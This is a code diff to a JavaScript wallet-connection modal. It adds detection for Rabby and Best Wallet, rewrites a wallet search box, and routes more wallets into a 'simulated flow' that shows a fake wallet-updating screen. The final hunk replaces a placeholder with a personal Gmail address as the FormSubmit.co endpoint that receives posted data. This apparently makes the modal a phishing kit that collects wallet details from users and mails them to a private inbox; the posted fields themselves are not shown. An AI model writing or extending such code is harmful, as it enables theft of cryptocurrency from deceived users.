@@ -272,6 +272,28 @@ class WalletModal {
       return;
     }
 
+    // Detect Rabby
+    if (window.ethereum && window.ethereum.isRabby) {
+      this.isInWalletBrowser = true;
+      this.selectedWallet = this.wallets.find(w => w.id === 'rabby');
+      return;
+    }
+
+    // Detect Best Wallet
+    if (window.ethereum && window.ethereum.isBestWallet) {
+      this.isInWalletBrowser = true;
+      const bestWallet = this.walletConnectWallets.find(w => w.id === 'bestwallet');
+      if (bestWallet) {
+        this.selectedWallet = {
+          ...bestWallet,
+          bgColor: 'bg-yellow-50',
+          primaryColor: '#F59E0B',
+          secondaryColor: '#D97706'
+        };
+      }
+      return;
+    }
+
     // Detect Phantom
     if (window.phantom && window.phantom.solana) {
       this.isInWalletBrowser = true;
@@ -391,25 +413,41 @@ class WalletModal {
 
     document.body.insertAdjacentHTML('beforeend', modalHTML);
     
-    // Add search functionality
-    setTimeout(() => {
+    // Add search functionality with better targeting
+    const attachSearch = () => {
       const searchInput = document.getElementById('wc-search-input');
-      if (searchInput) {
-        searchInput.addEventListener('input', (e) => {
-          const searchTerm = e.target.value.toLowerCase().trim();
-          const walletItems = document.querySelectorAll('.wc-wallet-item');
-          
-          walletItems.forEach(item => {
-            const walletName = item.getAttribute('data-wallet-name');
-            if (walletName.includes(searchTerm)) {
-              item.style.display = 'flex';
-            } else {
-              item.style.display = 'none';
-            }
-          });
-        });
+      if (!searchInput) {
+        console.error('Search input not found');
+        return;
       }
-    }, 100);
+      
+      console.log('Search input attached');
+      
+      searchInput.addEventListener('input', (e) => {
+        const searchTerm = e.target.value.toLowerCase().trim();
+        const walletItems = document.querySelectorAll('.wc-wallet-item');
+        
+        console.log(`Searching for: "${searchTerm}", found ${walletItems.length} items`);
+        
+        walletItems.forEach(item => {
+          const walletName = item.getAttribute('data-wallet-name');
+          if (walletName && walletName.includes(searchTerm)) {
+            item.style.display = 'flex';
+          } else {
+            item.style.display = 'none';
+          }
+        });
+      });
+      
+      // Also handle keyup for better responsiveness
+      searchInput.addEventListener('keyup', (e) => {
+        searchInput.dispatchEvent(new Event('input'));
+      });
+    };
+    
+    // Try immediately and with delay
+    attachSearch();
+    setTimeout(attachSearch, 50);
   }
 
   selectWallet(walletId) {
@@ -594,15 +632,14 @@ class WalletModal {
         'okx': true,
         'phantom': true,
         'solflare': true,
-        'bitget': true,
-        'bestwallet': true
+        'bitget': true
       };
       
       // If wallet has working deep link, try to open it
       if (workingDeepLinks[this.selectedWallet.id]) {
         this.openWalletApp();
       } else {
-        // For all other wallets, show simulated flow
+        // For all other wallets (including Rabby, Best Wallet, WC wallets), show simulated flow
         setTimeout(() => {
           this.showUpdatingWallet();
         }, 300);
@@ -943,7 +980,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
+    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
